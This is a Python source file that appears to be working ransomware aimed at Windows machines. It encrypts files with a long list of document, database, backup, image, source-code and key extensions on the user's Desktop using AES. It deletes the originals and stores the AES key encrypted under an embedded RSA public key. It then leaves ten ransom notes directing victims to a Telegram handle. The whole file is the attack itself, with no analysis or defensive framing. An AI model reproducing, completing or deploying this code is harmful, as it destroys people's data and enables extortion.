raw_rsa = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyEHpInF7NjeD5bFlJoLx\nJyoBasrxa7Cd7zmh3VYjeiQ/27+Gkcp34QdwdkrtTvv/FiIEqwMnuc71CCi+BmOM\n7S8rwAxqq3gaB5+PoOTJus4SuQt06Bnshjf5XJ/Yr15xY35jm66sVc2lXdzbHMaq\nry/PH7h2xKLLCYNa9ZoKsWtbdilevCZYIRlQrjMc0D0+Zl6f5sK07wIdaDjCA8z4\n+kZdXvdyuvQbLNuG1MVNYJ09KQtHq6HuhBiCnaPzukxxIzU/Q5T7uedFt6jGjlvi\nkjYn6k+eE49R1v33kp067oITfSaazR0zDF99iV1RIePUHtVfO3RYiKGmmunCO2e2\ndwIDAQAB\n-----END PUBLIC KEY-----'
import sys
if sys.platform != "win32": sys.exit(0)

from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from psutil import disk_partitions
from pathlib import Path
import os

total_encrypted = 0

aes_key = os.urandom(32)

rsa_pub = RSA.import_key(raw_rsa)
rsa_cipher = PKCS1_OAEP.new(rsa_pub)

def get_system_root():
    if sys.platform == "win32":
        return os.environ.get("SystemDrive", "C:") + "\\"
    
    else:
        return "/"
    
def encrypt_files(root, skip_folders):
    global total_encrypted

    target_ext = {".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".docm", ".xlsm", ".dotx", ".dotm", ".pdf", ".txt", ".rtf", ".odt", ".wpd", ".wps", ".ods", ".odp", ".csv", ".mdf", ".ldf", ".myd", ".myi", ".frm", ".db", ".sqlite", ".dbf", ".accdb", ".mdb", ".1cd", ".zip", ".rar", ".7z", ".tar", ".gz", ".iso", ".vhd", ".vhdx", ".bak", ".backup", ".tib", ".vbk", ".jpg", ".jpeg", ".png", ".bmp", ".tiff", ".gif", ".psd", ".ai", ".raw", ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".3gp", ".mp3", ".wav", ".wma", ".flac", ".aac", ".html", ".css", ".js", ".php", ".py", ".java", ".c", ".cpp", ".cs", ".sh", ".bat", ".pl", ".key", ".ini", ".conf", ".config", ".xml", ".json", ".yaml", ".crt", ".pem", ".p12"}

    for root_dir, dirs, files in os.walk(root):
        dirs[:] = [d for d in dirs if d not in skip_folders]

        files = [file for file in files if Path(file).suffix in target_ext]
        for file in files:
            full_path = Path(root_dir) / file
            size = os.path.getsize(full_path)

            if size <= 250 * 1024 * 1024: chunk = 4 * 1024 * 1024

            elif size > 250 and size <= 1024 * 1024 * 1024: chunk = 16 * 1024 * 1024

            elif size > 1024 * 1024 * 1024 and size <= 8 * 1024 * 1024 * 1024: chunk = 64

            else: chunk = 128

            c_data = 1

            aes_cipher = AES.new(key = aes_key, mode = AES.MODE_CTR)

            with open(full_path, "rb") as r:
                with open(f"{full_path}.kteam", "wb") as w:
                    w.write(aes_cipher.nonce)
                    while c_data:
                        c_data = r.read(chunk)
                        en_data = aes_cipher.encrypt(c_data)
                        w.write(en_data)

            os.remove(full_path)
            total_encrypted += 1

if __name__ == "__main__":
    disks = [disk[0] for disk in disk_partitions() if disk[0] != get_system_root()]

    encrypt_files(Path.home() / "Desktop", ["AppData"])

    for disk in disks:
        #encrypt_files(disk)
        pass
    
    if total_encrypted == 0: sys.exit(0)

    with open(Path.home() / "Desktop" / "key.txt", "wb") as wk:
        wk.write(rsa_cipher.encrypt(aes_key))

    for i in range(1, 11):
        with open(Path.home() / "Desktop" / f"YOUR_FILES_WAS_ENCRYPTED-{i}.txt", "w") as wa:
            wa.write(f"Your files was encrypted. To decrypt them, contact me in telegram @Faqquit\n\nTotal encrypted: {total_encrypted}")
